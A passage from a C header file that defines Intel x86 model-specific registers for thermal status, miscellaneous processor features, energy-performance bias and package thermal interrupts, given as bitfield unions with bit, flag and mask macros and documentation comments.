     * [Bit 2] PROCHOT \# or FORCEPR\# event
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 ProchotForceprEvent : 1;
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT_BIT 2
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT_FLAG 0x04
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT_MASK 0x01
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_EVENT(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] PROCHOT \# or FORCEPR\# log
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 ProchotForceprLog : 1;
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG_BIT 3
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG_FLAG 0x08
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG_MASK 0x01
#define IA32_THERM_STATUS_PROCHOT_FORCEPR_LOG(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Critical Temperature Status
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 CriticalTemperatureStatus : 1;
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_BIT 4
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_FLAG 0x10
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_MASK 0x01
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Critical Temperature Status log
     *
     * @remarks If CPUID.01H:EDX[22] = 1
     */
    UINT64 CriticalTemperatureStatusLog : 1;
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_BIT 5
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_FLAG 0x20
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_MASK 0x01
#define IA32_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Thermal Threshold \#1 Status
     *
     * @remarks If CPUID.01H:ECX[8] = 1
     */
    UINT64 ThermalThreshold1Status : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_BIT 6
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_FLAG 0x40
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_MASK 0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_STATUS(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Thermal Threshold \#1 log
     *
     * @remarks If CPUID.01H:ECX[8] = 1
     */
    UINT64 ThermalThreshold1Log : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG_BIT 7
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG_FLAG 0x80
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG_MASK 0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD1_LOG(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Thermal Threshold \#2 Status
     *
     * @remarks If CPUID.01H:ECX[8] = 1
     */
    UINT64 ThermalThreshold2Status : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_BIT 8
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_FLAG 0x100
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_MASK 0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_STATUS(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] Thermal Threshold \#2 log
     *
     * @remarks If CPUID.01H:ECX[8] = 1
     */
    UINT64 ThermalThreshold2Log : 1;
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG_BIT 9
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG_FLAG 0x200
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG_MASK 0x01
#define IA32_THERM_STATUS_THERMAL_THRESHOLD2_LOG(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] Power Limitation Status
     *
     * @remarks If CPUID.06H:EAX[4] = 1
     */
    UINT64 PowerLimitationStatus : 1;
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS_BIT 10
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS_FLAG 0x400
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS_MASK 0x01
#define IA32_THERM_STATUS_POWER_LIMITATION_STATUS(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] Power Limitation log
     *
     * @remarks If CPUID.06H:EAX[4] = 1
     */
    UINT64 PowerLimitationLog : 1;
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG_BIT 11
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG_FLAG 0x800
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG_MASK 0x01
#define IA32_THERM_STATUS_POWER_LIMITATION_LOG(_) (((_) >> 11) & 0x01)

    /**
     * [Bit 12] Current Limit Status
     *
     * @remarks If CPUID.06H:EAX[7] = 1
     */
    UINT64 CurrentLimitStatus : 1;
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS_BIT 12
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS_FLAG 0x1000
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS_MASK 0x01
#define IA32_THERM_STATUS_CURRENT_LIMIT_STATUS(_) (((_) >> 12) & 0x01)

    /**
     * [Bit 13] Current Limit log
     *
     * @remarks If CPUID.06H:EAX[7] = 1
     */
    UINT64 CurrentLimitLog : 1;
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG_BIT 13
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG_FLAG 0x2000
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG_MASK 0x01
#define IA32_THERM_STATUS_CURRENT_LIMIT_LOG(_) (((_) >> 13) & 0x01)

    /**
     * [Bit 14] Cross Domain Limit Status
     *
     * @remarks If CPUID.06H:EAX[7] = 1
     */
    UINT64 CrossDomainLimitStatus : 1;
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS_BIT 14
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS_FLAG 0x4000
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS_MASK 0x01
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_STATUS(_) (((_) >> 14) & 0x01)

    /**
     * [Bit 15] Cross Domain Limit log
     *
     * @remarks If CPUID.06H:EAX[7] = 1
     */
    UINT64 CrossDomainLimitLog : 1;
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG_BIT 15
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG_FLAG 0x8000
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG_MASK 0x01
#define IA32_THERM_STATUS_CROSS_DOMAIN_LIMIT_LOG(_) (((_) >> 15) & 0x01)

    /**
     * [Bits 22:16] Digital Readout
     *
     * @remarks If CPUID.06H:EAX[0] = 1
     */
    UINT64 DigitalReadout : 7;
#define IA32_THERM_STATUS_DIGITAL_READOUT_BIT 16
#define IA32_THERM_STATUS_DIGITAL_READOUT_FLAG 0x7F0000
#define IA32_THERM_STATUS_DIGITAL_READOUT_MASK 0x7F
#define IA32_THERM_STATUS_DIGITAL_READOUT(_) (((_) >> 16) & 0x7F)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 30:27] Resolution in Degrees Celsius
     *
     * @remarks If CPUID.06H:EAX[0] = 1
     */
    UINT64 ResolutionInDegreesCelsius : 4;
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS_BIT 27
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS_FLAG 0x78000000
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS_MASK 0x0F
#define IA32_THERM_STATUS_RESOLUTION_IN_DEGREES_CELSIUS(_) (((_) >> 27) & 0x0F)

    /**
     * [Bit 31] Reading Valid
     *
     * @remarks If CPUID.06H:EAX[0] = 1
     */
    UINT64 ReadingValid : 1;
#define IA32_THERM_STATUS_READING_VALID_BIT 31
#define IA32_THERM_STATUS_READING_VALID_FLAG 0x80000000
#define IA32_THERM_STATUS_READING_VALID_MASK 0x01
#define IA32_THERM_STATUS_READING_VALID(_) (((_) >> 31) & 0x01)
    UINT64 Reserved2 : 32;
  };

  UINT64 Flags;
} IA32_THERM_STATUS_REGISTER;

/**
 * @brief Enable Misc. Processor Features <b>(R/W)</b>
 *
 * Allows a variety of processor functions to be enabled and disabled.
 */
#define IA32_MISC_ENABLE 0x000001A0
typedef union {
  struct {
    /**
     * @brief Fast-Strings Enable
     *
     * [Bit 0] When set, the fast-strings feature (for REP MOVS and REP STORS) is enabled (default).
     * When clear, fast-strings are disabled.
     *
     * @remarks 0F_0H
     */
    UINT64 FastStringsEnable : 1;
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE_BIT 0
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE_FLAG 0x01
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE_MASK 0x01
#define IA32_MISC_ENABLE_FAST_STRINGS_ENABLE(_) (((_) >> 0) & 0x01)
    UINT64 Reserved1 : 2;

    /**
     * @brief Automatic Thermal Control Circuit Enable <b>(R/W)</b>
     *
     * [Bit 3] - 1 = Setting this bit enables the thermal control circuit (TCC) portion of the Intel
     * Thermal Monitor feature. This allows the processor to automatically reduce power consumption
     * in response to TCC activation.
     * - 0 = Disabled.
     *
     * @note In some products clearing this bit might be ignored in critical thermal conditions, and
     * TM1, TM2 and adaptive thermal throttling will still be activated. The default value of this
     * field varies with product.
     * @remarks 0F_0H
     */
    UINT64 AutomaticThermalControlCircuitEnable : 1;
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE_BIT 3
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE_FLAG 0x08
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE_MASK 0x01
#define IA32_MISC_ENABLE_AUTOMATIC_THERMAL_CONTROL_CIRCUIT_ENABLE(_) (((_) >> 3) & 0x01)
    UINT64 Reserved2 : 3;

    /**
     * @brief Performance Monitoring Available <b>(R)</b>
     *
     * [Bit 7] - 1 = Performance monitoring enabled.
     * - 0 = Performance monitoring disabled.
     *
     * @remarks 0F_0H
     */
    UINT64 PerformanceMonitoringAvailable : 1;
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE_BIT 7
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE_FLAG 0x80
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE_MASK 0x01
#define IA32_MISC_ENABLE_PERFORMANCE_MONITORING_AVAILABLE(_) (((_) >> 7) & 0x01)
    UINT64 Reserved3 : 3;

    /**
     * @brief Branch Trace Storage Unavailable <b>(RO)</b>
     *
     * [Bit 11] - 1 = Processor doesn't support branch trace storage (BTS).
     * - 0 = BTS is supported.
     *
     * @remarks 0F_0H
     */
    UINT64 BranchTraceStorageUnavailable : 1;
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE_BIT 11
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE_FLAG 0x800
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE_MASK 0x01
#define IA32_MISC_ENABLE_BRANCH_TRACE_STORAGE_UNAVAILABLE(_) (((_) >> 11) & 0x01)

    /**
     * @brief Processor Event Based Sampling (PEBS) Unavailable <b>(RO)</b>
     *
     * [Bit 12] - 1 = PEBS is not supported.
     * - 0 = PEBS is supported.
     *
     * @remarks 06_0FH
     */
    UINT64 ProcessorEventBasedSamplingUnavailable : 1;
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE_BIT 12
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE_FLAG 0x1000
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE_MASK 0x01
#define IA32_MISC_ENABLE_PROCESSOR_EVENT_BASED_SAMPLING_UNAVAILABLE(_) (((_) >> 12) & 0x01)
    UINT64 Reserved4 : 3;

    /**
     * @brief Enhanced Intel SpeedStep Technology Enable <b>(R/W)</b>
     *
     * [Bit 16] - 0 = Enhanced Intel SpeedStep Technology disabled.
     * - 1 = Enhanced Intel SpeedStep Technology enabled.
     *
     * @remarks If CPUID.01H: ECX[7] = 1
     */
    UINT64 EnhancedIntelSpeedstepTechnologyEnable : 1;
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE_BIT 16
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE_FLAG 0x10000
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE_MASK 0x01
#define IA32_MISC_ENABLE_ENHANCED_INTEL_SPEEDSTEP_TECHNOLOGY_ENABLE(_) (((_) >> 16) & 0x01)
    UINT64 Reserved5 : 1;

    /**
     * @brief ENABLE MONITOR FSM <b>(R/W)</b>
     *
     * [Bit 18] When this bit is set to 0, the MONITOR feature flag is not set (CPUID.01H:ECX[bit3]
     * = 0). This indicates that MONITOR/MWAIT are not supported. Software attempts to execute
     * MONITOR/MWAIT will cause \#UD when this bit is 0. When this bit is set to 1 (default),
     * MONITOR/MWAIT are supported (CPUID.01H:ECX[bit 3] = 1). If the SSE3 feature flag ECX[0] is
     * not set (CPUID.01H:ECX[bit 0] = 0), the OS must not attempt to alter this bit. BIOS must
     * leave it in the default state. Writing this bit when the SSE3 feature flag is set to 0 may
     * generate a \#GP exception.
     *
     * @remarks 0F_03H
     */
    UINT64 EnableMonitorFsm : 1;
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM_BIT 18
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM_FLAG 0x40000
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM_MASK 0x01
#define IA32_MISC_ENABLE_ENABLE_MONITOR_FSM(_) (((_) >> 18) & 0x01)
    UINT64 Reserved6 : 3;

    /**
     * @brief Limit CPUID Maxval <b>(R/W)</b>
     *
     * [Bit 22] When this bit is set to 1, CPUID.00H returns a maximum value in EAX[7:0] of 2. BIOS
     * should contain a setup question that allows users to specify when the installed OS does not
     * support CPUID functions greater than 2. Before setting this bit, BIOS must execute the
     * CPUID.0H and examine the maximum value returned in EAX[7:0]. If the maximum value is greater
     * than 2, this bit is supported. Otherwise, this bit is not supported. Setting this bit when
     * the maximum value is not greater than 2 may generate a \#GP exception. Setting this bit may
     * cause unexpected behavior in software that depends on the availability of CPUID leaves
     * greater than 2.
     *
     * @remarks 0F_03H
     */
    UINT64 LimitCpuidMaxval : 1;
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL_BIT 22
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL_FLAG 0x400000
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL_MASK 0x01
#define IA32_MISC_ENABLE_LIMIT_CPUID_MAXVAL(_) (((_) >> 22) & 0x01)

    /**
     * @brief xTPR Message Disable <b>(R/W)</b>
     *
     * [Bit 23] When set to 1, xTPR messages are disabled. xTPR messages are optional messages that
     * allow the processor to inform the chipset of its priority.
     *
     * @remarks If CPUID.01H:ECX[14] = 1
     */
    UINT64 XtprMessageDisable : 1;
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE_BIT 23
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE_FLAG 0x800000
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE_MASK 0x01
#define IA32_MISC_ENABLE_XTPR_MESSAGE_DISABLE(_) (((_) >> 23) & 0x01)
    UINT64 Reserved7 : 10;

    /**
     * @brief XD Bit Disable <b>(R/W)</b>
     *
     * [Bit 34] When set to 1, the Execute Disable Bit feature (XD Bit) is disabled and the XD Bit
     * extended feature flag will be clear (CPUID.80000001H: EDX[20]=0). When set to a 0 (default),
     * the Execute Disable Bit feature (if available) allows the OS to enable PAE paging and take
     * advantage of data only pages.
     * BIOS must not alter the contents of this bit location, if XD bit is not supported. Writing
     * this bit to 1 when the XD Bit extended feature flag is set to 0 may generate a \#GP
     * exception.
     *
     * @remarks If CPUID.80000001H:EDX[20] = 1
     */
    UINT64 XdBitDisable : 1;
#define IA32_MISC_ENABLE_XD_BIT_DISABLE_BIT 34
#define IA32_MISC_ENABLE_XD_BIT_DISABLE_FLAG 0x400000000
#define IA32_MISC_ENABLE_XD_BIT_DISABLE_MASK 0x01
#define IA32_MISC_ENABLE_XD_BIT_DISABLE(_) (((_) >> 34) & 0x01)
    UINT64 Reserved8 : 29;
  };

  UINT64 Flags;
} IA32_MISC_ENABLE_REGISTER;

/**
 * Performance Energy Bias Hint.
 *
 * @remarks If CPUID.6H:ECX[3] = 1
 */
#define IA32_ENERGY_PERF_BIAS 0x000001B0
typedef union {
  struct {
    /**
     * @brief Power Policy Preference
     *
     * [Bits 3:0] - 0 indicates preference to highest performance.
     * - 15 indicates preference to maximize energy saving.
     */
    UINT64 PowerPolicyPreference : 4;
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE_BIT 0
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE_FLAG 0x0F
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE_MASK 0x0F
#define IA32_ENERGY_PERF_BIAS_POWER_POLICY_PREFERENCE(_) (((_) >> 0) & 0x0F)
    UINT64 Reserved1 : 60;
  };

  UINT64 Flags;
} IA32_ENERGY_PERF_BIAS_REGISTER;

/**
 * @brief Package Thermal Status Information <b>(RO)</b>
 *
 * Package Thermal Status Information. Contains status information about the package's thermal
 * sensor.
 *
 * @remarks If CPUID.06H: EAX[6] = 1
 * @see Vol3B[14.8(PACKAGE LEVEL THERMAL MANAGEMENT)]
 */
#define IA32_PACKAGE_THERM_STATUS 0x000001B1
typedef union {
  struct {
    /**
     * [Bit 0] Pkg Thermal Status
     */
    UINT64 ThermalStatus : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_BIT 0
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_FLAG 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Pkg Thermal Status Log
     */
    UINT64 ThermalStatusLog : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG_BIT 1
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG_FLAG 0x02
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_STATUS_LOG(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] Pkg PROCHOT \# event
     */
    UINT64 ProchotEvent : 1;
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT_BIT 2
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT_FLAG 0x04
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_EVENT(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Pkg PROCHOT \# log
     */
    UINT64 ProchotLog : 1;
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG_BIT 3
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG_FLAG 0x08
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_PROCHOT_LOG(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] Pkg Critical Temperature Status
     */
    UINT64 CriticalTemperatureStatus : 1;
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_BIT 4
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_FLAG 0x10
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS(_) (((_) >> 4) & 0x01)

    /**
     * [Bit 5] Pkg Critical Temperature Status Log
     */
    UINT64 CriticalTemperatureStatusLog : 1;
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_BIT 5
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_FLAG 0x20
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_CRITICAL_TEMPERATURE_STATUS_LOG(_) (((_) >> 5) & 0x01)

    /**
     * [Bit 6] Pkg Thermal Threshold \#1 Status
     */
    UINT64 ThermalThreshold1Status : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_BIT 6
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_FLAG 0x40
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_STATUS(_) (((_) >> 6) & 0x01)

    /**
     * [Bit 7] Pkg Thermal Threshold \#1 log
     */
    UINT64 ThermalThreshold1Log : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG_BIT 7
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG_FLAG 0x80
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD1_LOG(_) (((_) >> 7) & 0x01)

    /**
     * [Bit 8] Pkg Thermal Threshold \#2 Status
     */
    UINT64 ThermalThreshold2Status : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_BIT 8
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_FLAG 0x100
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_STATUS(_) (((_) >> 8) & 0x01)

    /**
     * [Bit 9] Pkg Thermal Threshold \#2 log
     */
    UINT64 ThermalThreshold2Log : 1;
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG_BIT 9
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG_FLAG 0x200
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_THERMAL_THRESHOLD2_LOG(_) (((_) >> 9) & 0x01)

    /**
     * [Bit 10] Pkg Power Limitation Status
     */
    UINT64 PowerLimitationStatus : 1;
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS_BIT 10
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS_FLAG 0x400
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_STATUS(_) (((_) >> 10) & 0x01)

    /**
     * [Bit 11] Pkg Power Limitation log
     */
    UINT64 PowerLimitationLog : 1;
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG_BIT 11
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG_FLAG 0x800
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG_MASK 0x01
#define IA32_PACKAGE_THERM_STATUS_POWER_LIMITATION_LOG(_) (((_) >> 11) & 0x01)
    UINT64 Reserved1 : 4;

    /**
     * [Bits 22:16] Pkg Digital Readout
     */
    UINT64 DigitalReadout : 7;
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT_BIT 16
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT_FLAG 0x7F0000
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT_MASK 0x7F
#define IA32_PACKAGE_THERM_STATUS_DIGITAL_READOUT(_) (((_) >> 16) & 0x7F)
    UINT64 Reserved2 : 41;
  };

  UINT64 Flags;
} IA32_PACKAGE_THERM_STATUS_REGISTER;

/**
 * @brief Package Thermal Interrupt Control <b>(RO)</b>
 *
 * Enables and disables the generation of an interrupt on temperature transitions detected with the
 * package's thermal sensor.
 *
 * @remarks If CPUID.06H: EAX[6] = 1
 * @see Vol3B[14.8(PACKAGE LEVEL THERMAL MANAGEMENT)]
 */
#define IA32_PACKAGE_THERM_INTERRUPT 0x000001B2
typedef union {
  struct {
    /**
     * [Bit 0] Pkg High-Temperature Interrupt Enable.
     */
    UINT64 HighTemperatureInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_BIT 0
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_HIGH_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Pkg Low-Temperature Interrupt Enable.
     */
    UINT64 LowTemperatureInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_BIT 1
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_FLAG 0x02
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_LOW_TEMPERATURE_INTERRUPT_ENABLE(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] Pkg PROCHOT\# Interrupt Enable.
     */
    UINT64 ProchotInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_BIT 2
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_FLAG 0x04
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_PROCHOT_INTERRUPT_ENABLE(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * [Bit 4] Pkg Overheat Interrupt Enable.
     */
    UINT64 OverheatInterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE_BIT 4
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE_FLAG 0x10
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_OVERHEAT_INTERRUPT_ENABLE(_) (((_) >> 4) & 0x01)
    UINT64 Reserved2 : 3;

    /**
     * [Bits 14:8] Pkg Threshold \#1 Value
     */
    UINT64 Threshold1Value : 7;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE_BIT 8
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE_FLAG 0x7F00
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE_MASK 0x7F
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_VALUE(_) (((_) >> 8) & 0x7F)

    /**
     * [Bit 15] Pkg Threshold \#1 Interrupt Enable.
     */
    UINT64 Threshold1InterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_BIT 15
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_FLAG 0x8000
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE_MASK 0x01
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD1_INTERRUPT_ENABLE(_) (((_) >> 15) & 0x01)

    /**
     * [Bits 22:16] Pkg Threshold \#2 Value.
     */
    UINT64 Threshold2Value : 7;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE_BIT 16
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE_FLAG 0x7F0000
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE_MASK 0x7F
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_VALUE(_) (((_) >> 16) & 0x7F)

    /**
     * [Bit 23] Pkg Threshold \#2 Interrupt Enable.
     */
    UINT64 Threshold2InterruptEnable : 1;
#define IA32_PACKAGE_THERM_INTERRUPT_THRESHOLD2_INTERRUPT_ENABLE_BIT 23
